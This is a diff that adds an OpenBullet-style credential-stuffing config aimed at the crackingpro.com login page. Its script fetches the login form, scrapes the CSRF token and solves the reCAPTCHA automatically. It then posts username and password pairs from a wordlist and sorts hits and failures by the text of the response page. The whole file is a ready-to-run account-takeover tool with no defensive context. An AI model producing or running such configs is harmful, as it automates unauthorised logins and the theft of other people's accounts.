@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "Crackingpro.com",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-14T06:27:42.4079969-07:00",
+  "AdditionalInfo": "https://github.com/GeniLoyd/swatconfigs",
+  "Author": "SWAT - BREAKINGIN.TO",
+  "Version": "1.1.5",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.crackingpro.com/index.php?/login/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.crackingpro.com" 
+  HEADER "referer: https://www.crackingpro.com/index.php?/login/" 
+
+PARSE "<SOURCE>" LR "name=\"csrfKey\" value=\"" "\">" -> VAR "csrf" 
+
+RECAPTCHA "https://www.crackingpro.com/index.php?/login" "6LfdT0EUAAAAAJOz-V1TlrnRMpZhgn2Bj7uPjf1g" -> VAR "capt" 
+
+REQUEST POST "https://www.crackingpro.com/index.php?/login/" 
+  CONTENT "csrfKey=<csrf>&auth=<USER>&password=<PASS>&remember_me=1&captcha_field=1&g-recaptcha-response=<capt>&_processLogin=usernamepassword&_processLogin=usernamepassword" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.crackingpro.com" 
+  HEADER "referer: https://www.crackingpro.com/index.php?/login/" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Sign Out" 
+  KEYCHAIN Failure OR 
+    KEY "You did not pass the security check. Please try again." 
+    KEY "The display name or password was incorrect. Please try again (make sure your caps lock is off)." 
+
